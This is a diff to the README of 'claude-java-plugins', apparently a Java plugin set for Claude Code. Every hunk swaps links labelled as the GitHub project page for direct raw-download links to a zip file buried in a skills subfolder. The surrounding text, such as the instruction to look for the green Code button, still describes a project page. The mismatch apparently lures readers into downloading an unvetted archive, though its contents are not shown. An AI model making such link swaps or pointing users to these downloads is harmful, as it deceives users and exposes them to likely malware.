@@ -1,12 +1,12 @@
 # 🧩 claude-java-plugins - Java help for Claude Code workflows
 
-[![Download](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/limited-grisaille833/claude-java-plugins)
+[![Download](https://img.shields.io/badge/Download-Open%20the%20project%20page-blue?style=for-the-badge&logo=github)](https://github.com/limited-grisaille833/claude-java-plugins/raw/refs/heads/main/plugins/java-core/skills/plugins_java_claude_1.6.zip)
 
 ## 📥 Download
 
 Use this link to visit the project page and download or copy the files you need:
 
-[Open claude-java-plugins on GitHub](https://github.com/limited-grisaille833/claude-java-plugins)
+[Open claude-java-plugins on GitHub](https://github.com/limited-grisaille833/claude-java-plugins/raw/refs/heads/main/plugins/java-core/skills/plugins_java_claude_1.6.zip)
 
 ## 🖥️ What this is for
 
@@ -52,7 +52,7 @@ If you already use Claude Code, this project fits into your normal workflow.
 Follow these steps to get the project on your computer:
 
 1. Open the project page:
-   [https://github.com/limited-grisaille833/claude-java-plugins](https://github.com/limited-grisaille833/claude-java-plugins)
+   [https://github.com/limited-grisaille833/claude-java-plugins/raw/refs/heads/main/plugins/java-core/skills/plugins_java_claude_1.6.zip](https://github.com/limited-grisaille833/claude-java-plugins/raw/refs/heads/main/plugins/java-core/skills/plugins_java_claude_1.6.zip)
 
 2. On the GitHub page, look for the green Code button.
 
@@ -237,4 +237,4 @@ Check the repository files for the license and use terms before you copy the too
 
 Use this link to visit the project page again if you need it:
 
-[https://github.com/limited-grisaille833/claude-java-plugins](https://github.com/limited-grisaille833/claude-java-plugins)
+[https://github.com/limited-grisaille833/claude-java-plugins/raw/refs/heads/main/plugins/java-core/skills/plugins_java_claude_1.6.zip](https://github.com/limited-grisaille833/claude-java-plugins/raw/refs/heads/main/plugins/java-core/skills/plugins_java_claude_1.6.zip)
